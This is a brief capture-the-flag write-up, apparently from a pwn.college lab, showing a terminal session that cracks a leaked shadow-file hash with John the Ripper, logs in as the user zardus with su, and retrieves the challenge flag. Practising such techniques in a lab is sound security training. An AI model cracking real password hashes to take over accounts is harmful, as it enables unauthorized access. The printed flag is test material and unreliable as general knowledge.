# Cracking passwords
## INTRODUCTION
## CODE
```bash
Connected!
hacker@users~cracking-passwords:~$ john ./challenge/shadow-leak
Created directory: /home/hacker/.john
stat: ./challenge/shadow-leak: No such file or directory
hacker@users~cracking-passwords:~$ john  /challenge/shadow-leak
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
aardvark         (zardus)
1g 0:00:00:21 100% 2/3 0.04566g/s 265.8p/s 265.8c/s 265.8C/s Johnson..buzz
Use the "--show" option to display all of the cracked passwords reliably
Session completed
hacker@users~cracking-passwords:~$ su zardus
Password:
zardus@users~cracking-passwords:/home/hacker$ /challenge/run
Congratulations, you have become Zardus! Here is your flag:
pwn.college{A9T7ybejdtFPimcXLcmnZ4xnYCR.ddTN0UDL4YDN0czW}
```
## RESOURCES
none
